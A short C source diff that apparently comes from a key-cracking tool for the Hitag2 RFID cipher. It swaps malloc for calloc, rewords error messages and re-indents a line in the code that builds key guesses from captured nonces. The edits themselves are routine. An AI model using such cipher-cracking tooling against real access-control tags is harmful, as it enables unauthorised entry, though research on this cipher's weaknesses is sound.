@@ -225,9 +225,9 @@ static uint64_t packstate(uint64_t s) {
 
 /* create_guess_table mallocs the tables */
 static void create_guess_table(void) {
-    guesses = (struct guess *)malloc(sizeof(struct guess) * maxtablesize);
+    guesses = (struct guess *)calloc(1, sizeof(struct guess) * maxtablesize);
     if (!guesses) {
-        printf("cannot malloc guess table\n");
+        printf("cannot allocate memory for guess table\n");
         exit(1);
     }
 }
@@ -264,9 +264,9 @@ static void init_guess_table(char *filename, char *uidstr) {
     }
 
     num_nRaR = 0;
-    buf = (char *)malloc(lenbuf);
+    buf = (char *)calloc(1, lenbuf);
     if (!buf) {
-        printf("cannot malloc buf\n");
+        printf("cannot calloc buf\n");
         exit(1);
     }
 
@@ -442,7 +442,7 @@ static void score_traces(struct guess *g, unsigned int size) {
         // then shift by size - 16, insert upper key XOR enc_nonce XOR bitstream,
         // and calc new bit b
         uint64_t lfsr = (uid >> (size - 16)) | ((g->key << (48 - size)) ^
-                                       ((nonces[i].enc_nR ^ g->b0to31[i]) << (64 - size)));
+                                                ((nonces[i].enc_nR ^ g->b0to31[i]) << (64 - size)));
         g->b0to31[i] = g->b0to31[i] | (ht2crypt(lfsr) << (size - 16));
 
         // create lfsr - lower 16 bits are lower 16 bits of key
